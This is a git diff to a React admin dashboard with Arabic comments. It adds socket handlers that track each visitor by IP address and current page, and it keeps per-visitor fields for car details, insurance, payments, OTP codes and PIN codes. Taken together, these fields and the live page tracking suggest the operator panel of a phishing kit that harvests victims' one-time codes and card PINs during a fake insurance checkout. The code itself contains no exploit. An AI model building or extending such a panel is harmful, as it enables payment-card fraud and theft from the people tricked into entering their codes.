@@ -121,10 +121,74 @@ export default function AdminDashboard() {
       ));
     });
 
-    socket.on('locationUpdated', ({ ip, page }) => {
-      setCustomers(prev => prev.map(c => 
-        c.ip === ip ? { ...c, currentPage: page } : c
-      ));
+    socket.on('locationUpdated', ({ ip, page, timestamp }) => {
+      setCustomers(prev => {
+        const existingCustomer = prev.find(c => c.ip === ip);
+        
+        if (existingCustomer) {
+          // تحديث الصفحة الحالية للعميل الموجود
+          return prev.map(c => 
+            c.ip === ip ? { ...c, currentPage: page, lastUpdate: timestamp ? new Date(timestamp).getTime() : Date.now() } : c
+          );
+        } else {
+          // إضافة عميل جديد إذا لم يكن موجوداً
+          return [{
+            ip,
+            currentPage: page,
+            carDetails: null,
+            moreDetails: null,
+            insurance: null,
+            customerInfo: null,
+            payments: [],
+            otpCodes: [],
+            pinCodes: [],
+            status: 'pending',
+            lastUpdate: timestamp ? new Date(timestamp).getTime() : Date.now(),
+            isActive: true
+          }, ...prev];
+        }
+      });
+    });
+
+    // استمع لتحديثات قائمة العملاء من الباكند
+    socket.on('customersUpdate', (updatedCustomers) => {
+      console.log('📋 Received customers update:', updatedCustomers);
+      
+      // دمج بيانات العملاء المحدثة مع البيانات الحالية
+      setCustomers(prev => {
+        const customersMap = new Map(prev.map(c => [c.ip, c]));
+        
+        updatedCustomers.forEach(customer => {
+          const existing = customersMap.get(customer.ip);
+          if (existing) {
+            // تحديث العميل الموجود
+            customersMap.set(customer.ip, {
+              ...existing,
+              currentPage: customer.currentPage,
+              lastUpdate: customer.lastSeen ? new Date(customer.lastSeen).getTime() : existing.lastUpdate,
+              isActive: customer.status === 'active'
+            });
+          } else {
+            // إضافة عميل جديد
+            customersMap.set(customer.ip, {
+              ip: customer.ip,
+              currentPage: customer.currentPage,
+              carDetails: null,
+              moreDetails: null,
+              insurance: null,
+              customerInfo: null,
+              payments: [],
+              otpCodes: [],
+              pinCodes: [],
+              status: 'pending',
+              lastUpdate: customer.lastSeen ? new Date(customer.lastSeen).getTime() : Date.now(),
+              isActive: customer.status === 'active'
+            });
+          }
+        });
+        
+        return Array.from(customersMap.values()).sort((a, b) => b.lastUpdate - a.lastUpdate);
+      });
     });
 
     return () => {
@@ -136,6 +200,7 @@ export default function AdminDashboard() {
       socket.off('userConnected');
       socket.off('userDisconnected');
       socket.off('locationUpdated');
+      socket.off('customersUpdate');
     };
   }, [socket, connected]);
 
